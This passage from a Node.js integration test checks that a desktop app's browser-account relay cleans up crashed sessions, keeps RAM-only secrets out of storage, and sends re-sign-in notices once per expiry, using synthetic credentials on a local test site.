      stopProcess(w.identity, 'SIGKILL'); await w.closed
      await store.cleanup()
      const after = store.current(row.id)
      assert(step === 'current' ? after !== before : after === before, 'publication pointer changed at the wrong checkpoint')
      const lease = await store.checkout(row.id)
      if (step === 'current') assert(readFileSync(join(lease.profile, 'publication-proof'), 'utf8') === proof, 'current version is not whole')
      store.discard(lease)
      assert.equal(readdirSync(store.folder(row.id)).filter(name => name.startsWith('v-')).length, 1)
      assert(!existsSync(w.ready.folder), 'crashed lease was not cleaned')
      checks.push(`actual SIGKILL at ${step}: whole current version and orphan cleanup`)
    }
    const w = await worker('version', randomBytes(24).toString('hex'))
    let copied = false, cleaned = false
    const copy = store.checkout(row.id).then(lease => { copied = true; return lease })
    const cleanup = store.cleanup().then(() => { cleaned = true })
    await new Promise(ok => setTimeout(ok, 100))
    assert(!copied && !cleaned, 'checkout/cleanup bypassed publisher lock')
    w.child.stdin.write('continue\n')
    await w.closed
    const lease = await copy; await cleanup
    assert(existsSync(join(lease.profile, 'publication-proof')), 'parallel checkout did not receive the whole new version')
    store.discard(lease)
    checks.push('startup checkout and cleanup wait for the publisher and retain the whole new version')
    }
    const surviving = await browser(row)
    await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
    site.expire('same')
    const crashed = await worker('relay')
    assert(existsSync(join(crashed.ready.folder, 'secrets.json')), 'real relay did not create its RAM-only secret file')
    assert.equal(statSync(join(crashed.ready.folder, 'secrets.json')).mode & 0o777, 0o600)
    stopProcess(crashed.identity, 'SIGKILL'); await crashed.closed
    const crashState = () => {
      let lease = null, ownerTicks = null, children = []
      try { lease = JSON.parse(readFileSync(join(crashed.ready.folder, 'lease.json'), 'utf8')) } catch { /* absent */ }
      try { ownerTicks = readFileSync(`/proc/${lease?.pid}/stat`, 'utf8').split(') ')[1].split(' ')[19] } catch { /* dead */ }
      try { children = readdirSync(crashed.ready.folder) } catch { /* absent */ }
      return { lease, ownerTicks, children }
    }
    const beforeCleanup = crashState()
    const launches = readdirSync(join(store.runtime(), '.launches')).filter(name => name.endsWith('.json'))
      .map(name => JSON.parse(readFileSync(join(store.runtime(), '.launches', name), 'utf8')))
      .filter(record => record.folder === crashed.ready.folder)
    assert(launches.some(record => record.init), 'running browser has no registered namespace identity')
    const next = new AccountBrowserRelay({ store, allowed: true }); relays.push(next); await next.start()
    const liveIdentity = identity => {
      try {
        const stat = readFileSync(`/proc/${identity.pid}/stat`, 'utf8').split(') ')[1].split(' ')
        return stat[0] !== 'Z' && stat[19] === identity.ticks
      } catch { return false }
    }
    assert(launches.every(record => ['init', 'monitor', 'launcher'].every(key => !record[key] || !liveIdentity(record[key]))), 'registered browser writer remains alive')
    atomicJson(join(out, 'crash-cleanup.json'), { beforeCleanup, launches, afterCleanup: crashState() })
    assert(!existsSync(crashed.ready.folder), 'next real relay did not remove the crashed secret copy')
    await new Promise(ok => setTimeout(ok, 750))
    assert(!existsSync(crashed.ready.folder), 'crashed browser recreated its profile after cleanup')
    assert.equal(await surviving.page().evaluate(() => 1 + 1), 2, 'cleanup stopped a separate live browser')
    await surviving.end(false)
    await next.end(false)
    checks.push('actual relay SIGKILL: registered namespace writers exit, RAM secret/profile stay absent, separate live session survives')
  } else if (phase === 'notices') {
    const { registerBrowserAccounts } = await import('../../apps/desktop/src/main/browser-accounts-ipc.ts')
    const handlers = new Map(), notices = [], owner = {}
    let finishedBegins = 0
    const originalBegin = AccountSignIn.prototype.begin
    AccountSignIn.prototype.begin = async function (params) {
      const row = await originalBegin.call(this, { ...params, headless: true })
      const page = this.sessions.get(row.id).page
      await page.locator('[name=user]').fill('synthetic'); await page.locator('[name=password]').fill(site.password)
      await page.locator('[name=code]').fill(authenticatorCode(site.authenticator))
      await page.getByRole('button', { name: 'Sign in' }).click(); await page.getByRole('heading', { name: 'Signed in' }).waitFor()
      finishedBegins++
      return row
    }
    const registered = registerBrowserAccounts({
      environment: process.env, handle: (channel, handler) => handlers.set(channel, handler),
      allowed: event => event === owner, notify: (notice, click) => notices.push({ notice, click })
    })
    const view = () => handlers.get('aiterm:browser:accounts')(owner)
    const action = args => handlers.get('aiterm:browser:account-action')(owner, args)
    const until = async predicate => {
      const deadline = Date.now() + 10_000
      while (!predicate()) { assert(Date.now() < deadline, 'notice/sign-in callback timed out'); await new Promise(ok => setTimeout(ok, 50)) }
    }
    try {
      assert.throws(() => handlers.get('aiterm:browser:accounts')({}), /only available in BMN/)
      const added = await action({ action: 'add', name: 'notice account', url: site.url('same') })
      assert(added.ok && added.view.signingIn.length === 1)
      const row = added.view.accounts[0]
      const saved = await action({ action: 'done', id: row.id }); assert(saved.ok && saved.view.accounts[0].state === 'Signed in')
      site.expire('same')
      const relay = await browser(row); await relay.end(false)
      await until(() => notices.length === 1)
      assert.equal(view().accounts[0].state, 'Sign in again')
      await new Promise(ok => setTimeout(ok, 1200)); assert.equal(notices.length, 1)
      notices[0].click()
      await until(() => finishedBegins === 2)
      const renewed = await action({ action: 'done', id: row.id })
      assert(renewed.ok && renewed.view.accounts[0].state === 'Signed in', 'clicked notice did not restore the account')
      checks.push('real account IPC add/Done; once-per-occurrence notice clicked; fresh sign-in window completes; state clears')
      await store.mark(row.id, { username: 'synthetic', password: site.password, authenticator: site.authenticator })
      site.expire('same')
      for (let n = 0; n < 2; n++) {
        const failed = await browser(row)
        assert(!(await failed.tool('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' })).isError)
        await failed.end()
        await until(() => notices.length >= 2)
        await new Promise(ok => setTimeout(ok, 1200))
        assert.equal(notices.length, 2, 'same marked expiry announced more than once')
      }
      await action({ action: 'sign-in', id: row.id }); await action({ action: 'done', id: row.id })
      site.expire('same')
      const failed = await browser(row)
      await failed.tool('browser_type', { target: '[name=password]', text: 'BMN_PASSWORD' }); await failed.end()
      await until(() => notices.length === 3)
      checks.push('two failed marked sign-in attempts announce once; recovery then another expiry permits a new notice')
    } finally { await registered.dispose(); AccountSignIn.prototype.begin = originalBegin }
  } else throw new Error('Unknown live phase')
  for (const relay of relays) await relay.end(false)
  assert.equal(readdirSync(store.runtime()).filter(name => name.startsWith('s-') || name.startsWith('anonymous-')).length, 0, 'RAM lease left behind')
  assert.equal(store.claims().length, 0, 'RAM lease claim left behind')
  const files = assertNoValues(store.root, site.values)
  assertNoValues(join(process.env.HOME, 'config'), site.values)
  assert.equal(statSync(store.root).mode & 0o777, 0o700)
  checks.push(`encrypted data byte scan: ${files} files; zero private-value hits; RAM copies wiped`)
  result(out, phase, checks, ['actual agent clients, crash interruption, notices/Health and UI tested separately; installed real-account gates are owner-only'])
} catch (error) {
  atomicJson(join(out, 'result.json'), { phase, result: 'FAIL', checks, error: { name: error.name, code: error.code || null } })
  throw error
} finally {
  for (const worker of workers) if (worker.child.exitCode === null && worker.child.signalCode === null) { stopProcess(worker.identity, 'SIGKILL'); await worker.closed }
  for (const relay of relays) await relay.end(false).catch(() => {})
  for (const context of contexts) await context.close().catch(() => {})
  for (const lease of leases) store.discard(lease)
  await signIn.close().catch(() => {})
  for (const lease of store.claims()) if (lease.pid === process.pid) store.discard(lease)
  await site?.close()
  await ring.stop()
}
